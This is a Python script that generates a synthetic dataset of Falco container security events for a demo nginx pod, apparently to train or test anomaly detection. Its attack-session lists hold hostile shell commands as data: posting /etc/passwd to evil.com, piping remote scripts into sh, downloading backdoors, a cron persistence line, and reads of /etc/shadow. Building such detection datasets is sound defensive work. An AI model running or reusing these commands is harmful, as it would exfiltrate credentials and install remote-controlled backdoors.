#!/usr/bin/env python3
import os
import csv
import random
import uuid
from datetime import datetime, timedelta

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_PATH = os.path.join(BASE_DIR, "../datasets/falco_events_enriched.csv")
random.seed(42)

NAMESPACE = "demo-app"
POD = "nginx-demo-6c45f569f7-m7hqq"
NODE = "devsecops-lab-worker"
CONTAINER = "nginx"
IMAGE = "docker.io/library/nginx"
IMAGE_TAG = "latest"
START_DATE = datetime(2026, 8, 14, 0, 0, 0)
END_DATE = datetime(2026, 8, 21, 0, 0, 0)

ADMIN_COMMANDS = [
    ("nginx -s reload", "nginx", "nginx", "admin", "1000"),
    ("curl -s http://localhost:8080/health", "curl", "sh", "admin", "1000"),
    ("curl -s http://localhost:8080/metrics", "curl", "sh", "admin", "1000"),
    ("ls /etc/nginx/conf.d/", "ls", "sh", "admin", "1000"),
    ("cat /usr/share/nginx/html/index.html", "cat", "sh", "admin", "1000"),
    ("ps aux | grep nginx", "ps", "sh", "admin", "1000"),
    ("df -h", "df", "sh", "admin", "1000"),
    ("date", "date", "sh", "admin", "1000"),
    ("tail -20 /var/log/nginx/access.log", "tail", "sh", "admin", "1000"),
    ("stat /usr/share/nginx/html/index.html", "stat", "sh", "admin", "1000"),
    ("mkdir -p /tmp/nginx-cache", "mkdir", "sh", "admin", "1000"),
    ("cp /etc/nginx/nginx.conf /tmp/backup-nginx.conf", "cp", "sh", "admin", "1000"),
]
DEV_COMMANDS = [
    ("echo debug: user=root", "echo", "sh", "dev", "1001"),
    ("cat /var/log/nginx/error.log", "cat", "sh", "dev", "1001"),
    ("ls /tmp", "ls", "sh", "dev", "1001"),
    ("pwd", "pwd", "sh", "dev", "1001"),
    ("env | grep APP_", "env", "sh", "dev", "1001"),
    ("whoami", "whoami", "sh", "dev", "1001"),
    ("id", "id", "sh", "dev", "1001"),
    ("hostname", "hostname", "sh", "dev", "1001"),
    ("uname -a", "uname", "sh", "dev", "1001"),
    ("free -m", "free", "sh", "dev", "1001"),
    ("ls -la /usr/share/nginx/html/", "ls", "sh", "dev", "1001"),
    ("grep error /var/log/nginx/error.log", "grep", "sh", "dev", "1001"),
    ("find /tmp -name *.log", "find", "sh", "dev", "1001"),
]
BOT_COMMANDS = [
    ("curl -s -o /dev/null -w %{http_code} http://localhost:8080/", "curl", "sh", "bot", "999"),
    ("wget -qO- http://internal-monitoring:9090/metrics", "wget", "sh", "bot", "999"),
    ("echo build-ok", "echo", "sh", "bot", "999"),
    ("stat /usr/share/nginx/html/index.html", "stat", "sh", "bot", "999"),
    ("curl -s http://localhost:8080/ready", "curl", "sh", "bot", "999"),
    ("curl -s http://localhost:8080/metrics", "curl", "sh", "bot", "999"),
]
EDGE_NORMAL_COMMANDS = [
    ("curl -s http://example.com", "curl", "sh", "admin", "1000"),
    ("curl -s http://httpbin.org/get", "curl", "sh", "admin", "1000"),
    ("cat /etc/hostname", "cat", "sh", "dev", "1001"),
    ("cat /etc/resolv.conf", "cat", "sh", "dev", "1001"),
    ("ls /etc", "ls", "sh", "dev", "1001"),
    ("whoami", "whoami", "sh", "dev", "1001"),
    ("id", "id", "sh", "dev", "1001"),
]
RECON_COMMANDS = [
    ("whoami", "whoami", "sh", "root", "0"),
    ("id", "id", "sh", "root", "0"),
    ("uname -a", "uname", "sh", "root", "0"),
    ("env", "env", "sh", "root", "0"),
    ("ps aux", "ps", "sh", "root", "0"),
    ("ls -la /tmp", "ls", "sh", "root", "0"),
    ("cat /etc/passwd", "cat", "sh", "root", "0"),
    ("cat /etc/shadow", "cat", "sh", "root", "0"),
]
EXFIL_COMMANDS = [
    ("curl -s -X POST -d $(cat /etc/passwd) http://evil.com/collect", "curl", "sh", "root", "0"),
    ("curl -s http://pastebin.com/raw/XXXXX | sh", "curl", "sh", "root", "0"),
    ("wget -qO /tmp/backdoor.sh http://attacker.com/bd.sh", "wget", "sh", "root", "0"),
    ("curl -s -o /tmp/payload http://malware.com/payload.bin", "curl", "sh", "root", "0"),
]
PRIVESC_COMMANDS = [
    ("apt update", "apt", "sh", "root", "0"),
    ("apt install nmap", "apt", "sh", "root", "0"),
    ("apt --version", "apt", "sh", "root", "0"),
    ("su -", "su", "sh", "root", "0"),
    ("sudo -l", "sudo", "sh", "root", "0"),
]
PERSIST_COMMANDS = [
    ("echo */5 * * * * curl http://evil.com/cmd | sh >> /tmp/cron", "echo", "sh", "root", "0"),
    ("curl -s http://evil.com/backdoor.py -o /usr/share/nginx/html/backdoor.py", "curl", "sh", "root", "0"),
    ("sed -i s/listen 80/listen 8080/ /etc/nginx/conf.d/default.conf", "sed", "sh", "root", "0"),
]


def random_timestamp(start, end, bias_day=False, bias_night=False):
    delta = end - start
    ts = start + timedelta(seconds=random.randint(0, int(delta.total_seconds())))
    if random.random() < 0.3:
        return ts
    if bias_day:
        ts = ts.replace(hour=random.randint(9, 17), minute=random.randint(0, 59), second=random.randint(0, 59), microsecond=0)
    elif bias_night:
        ts = ts.replace(hour=random.randint(0, 5), minute=random.randint(0, 59), second=random.randint(0, 59), microsecond=0)
    return ts


def duration_for_command(command):
    if "apt" in command and "version" not in command:
        return random.uniform(4000, 25000)
    if any(x in command for x in ["curl", "wget", "evil.com"]):
        return random.uniform(200, 4000)
    return random.uniform(1, 40)


def generate_event(cmd_tuple, rule, priority, event_type="execve", file="", connection=""):
    command, proc_name, parent, user, user_uid = cmd_tuple
    ts = random_timestamp(START_DATE, END_DATE, bias_day=(user in ["admin", "dev"]))
    stamp = ts.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    if random.random() < 0.08:
        stamp = ts.strftime("%Y-%m-%dT%H:%M:%S")
    return {
        "timestamp": stamp,
        "uuid": str(uuid.uuid4()),
        "priority": priority,
        "rule": rule,
        "event_scope": "pod",
        "node": NODE,
        "namespace": NAMESPACE,
        "pod": POD,
        "container_id": "bd305088aa64",
        "container_name": CONTAINER,
        "image": IMAGE,
        "image_tag": IMAGE_TAG,
        "user": user,
        "user_uid": user_uid,
        "proc_name": proc_name,
        "proc_exepath": f"/usr/bin/{proc_name}" if proc_name != "sh" else "/bin/sh",
        "parent_process": parent,
        "command": command,
        "event_type": event_type,
        "file": file,
        "connection": connection,
        "command_duration_ms": round(duration_for_command(command), 2),
    }


def generate_session(commands, is_anomaly=False):
    events = []
    base_ts = random_timestamp(START_DATE, END_DATE)
    for i, cmd_tuple in enumerate(commands):
        ts = base_ts + timedelta(seconds=i * random.randint(1, 10))
        command = cmd_tuple[0]
        if "cat /etc/shadow" in command or "cat /etc/passwd" in command:
            rule, priority = "Read sensitive file untrusted", "Warning"
        elif "apt" in command and "version" not in command:
            rule, priority = "Unexpected package manager execution", "Warning"
        elif "evil.com" in command or "malware.com" in command or "attacker.com" in command:
            rule, priority = "Suspicious outbound connection", "Warning"
        elif is_anomaly:
            rule, priority = "Unexpected process spawned in application container", "Warning"
        else:
            rule, priority = "Baseline normal activity demo-app", "Informational"
        conn = ""
        if any(x in command for x in ["evil.com", "attacker.com", "malware.com", "pastebin.com"]):
            conn = "192.168.1.100:4444->93.184.216.34:80"
        elif any(x in command for x in ["localhost", "internal-", "example.com", "httpbin.org"]):
            conn = "127.0.0.1:12345->127.0.0.1:8080"
        file_target = ""
        if command.startswith("cat "):
            parts = command.split()
            file_target = parts[1] if len(parts) > 1 else ""
        # is_anomaly no longer forwarded — generate_event/duration_for_command
        # must not depend on the label, only on the command itself.
        event = generate_event(cmd_tuple, rule, priority, file=file_target, connection=conn)
        event["timestamp"] = ts.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
        events.append(event)
    return events

def main():
    all_events = []
    for _ in range(240):
        all_events.extend(generate_session([random.choice(ADMIN_COMMANDS)]))
    for _ in range(160):
        all_events.extend(generate_session([random.choice(DEV_COMMANDS)]))
    for _ in range(120):
        all_events.extend(generate_session([random.choice(BOT_COMMANDS)]))
    for _ in range(120):
        all_events.extend(generate_session([random.choice(EDGE_NORMAL_COMMANDS)]))
    for _ in range(40):
        seq = random.sample(RECON_COMMANDS, min(4, len(RECON_COMMANDS)))
        all_events.extend(generate_session(seq, is_anomaly=True))
    for _ in range(25):
        all_events.extend(generate_session([random.choice(EXFIL_COMMANDS)], is_anomaly=True))
    for _ in range(15):
        all_events.extend(generate_session([random.choice(PRIVESC_COMMANDS)], is_anomaly=True))
    for _ in range(15):
        all_events.extend(generate_session([random.choice(PERSIST_COMMANDS)], is_anomaly=True))
    all_events.sort(key=lambda x: x["timestamp"])
    os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
    fieldnames = [
        "timestamp", "uuid", "priority", "rule", "event_scope", "node", "namespace",
        "pod", "container_id", "container_name", "image", "image_tag", "user", "user_uid",
        "proc_name", "proc_exepath", "parent_process", "command",
        "event_type", "file", "connection", "command_duration_ms",
    ]
    with open(OUTPUT_PATH, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(all_events)
    print(f"[+] Genere {len(all_events)} evenements dans {OUTPUT_PATH}")


if __name__ == "__main__":
    main()
